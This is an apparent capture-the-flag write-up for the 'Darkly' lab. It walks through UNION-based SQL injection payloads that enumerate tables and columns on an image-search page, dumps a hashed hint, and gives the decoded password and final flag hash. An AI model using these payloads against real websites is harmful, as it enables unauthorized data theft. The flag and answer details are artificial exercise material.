<h1>Seventh flag of Darkly</h1>

<ol>

<li>Navigate to the page http://192.168.1.100/index.php?page=searchimg</li>
<li>Now that we are on the page here we can try for simple sql Injection by passing 1 , 1=1 or even passing 1 or 1 = 1 In doing this we see that data is being returned from the database so we try to get data from the tables in the database using SQL injection</li>
<li>Same as the previous flag we are going to try and get table name of the table here since we can see results of the sql query inside the application response</li>
<h3>-1  UNION SELECT  table_name, 1 FROM information_schema.tables where table_schema = database() </h3>

<p>here we got back 'list_images'</p>

<li> There after we are going to get the columns again too</li>
<h3>-1  UNION SELECT  column_name, 1 FROM information_schema.columns where table_schema = database() </h3>

<p>in our results we found this:</p>

ID: -1 union select null, concat (id, url, title, comment) from list_images 
Title: 5borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : 

<li>When we decode the given data we get the following string --> albatroz </li>
<li>sha 256 calculator result after passing in albatroz -->   f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188 </li>
</ol>

Well done you have found the second flag!

